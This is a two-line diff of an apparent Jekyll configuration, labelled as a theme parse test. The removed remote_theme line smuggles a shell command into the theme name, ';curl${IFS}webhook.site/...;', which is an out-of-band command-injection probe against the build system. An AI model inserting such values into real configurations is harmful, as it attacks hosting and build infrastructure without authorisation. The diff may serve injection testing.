@@ -1,2 +1,2 @@
-title: P05 Theme Branch Test
-remote_theme: "NewbieBot12/p05-theme-clean-1793360538@p05;curl${IFS}webhook.site/104aba09-fd59-4052-af92-584cf008d7dd;"
+title: P05 Theme Parse Test
+remote_theme: NewbieBot12/p05-theme-clean-1793360538
